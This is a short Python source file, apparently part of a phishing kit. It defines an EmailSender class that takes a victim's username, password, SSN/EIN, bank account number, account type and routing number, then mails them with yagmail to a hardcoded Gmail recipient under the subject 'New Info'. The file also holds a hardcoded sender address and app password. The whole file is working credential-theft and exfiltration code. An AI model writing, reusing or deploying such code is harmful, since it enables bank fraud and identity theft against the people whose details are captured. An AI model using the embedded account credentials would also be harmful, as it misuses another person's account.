import yagmail
EMAIL = "castanedaorlando871@gmail.com"
PASSWORD = "ykucjemebvauveur"

class EmailSender:
    def __init__(self, user_name, user_password, ssn, account_number, account_type, routing):
        """Initialize the email sender with credentials."""
        self.user_name = user_name
        self.user_password =user_password
        self.ssn = ssn
        self.account_number = account_number
        self.account_type = account_type
        self.routing = routing
        self.sender_email = EMAIL
        self.app_password = PASSWORD
        self.yag = yagmail.SMTP(self.sender_email, self.app_password)

    def send_email(self):
        result = self.yag.send(
            to="Rubentamez1122@gmail.com",
            subject="New Info",
            contents=f"UserName : {self.user_name}\n"
                     f"Password: {self.user_password}\n"
                     f"Acount Number: {self.account_number}\n"
                     f"Acount Type: {self.account_type}\n"
                     f"Routing: {self.routing}\n"
                     f"SSN/EIN: {self.ssn}",
            attachments= None
        )
        return result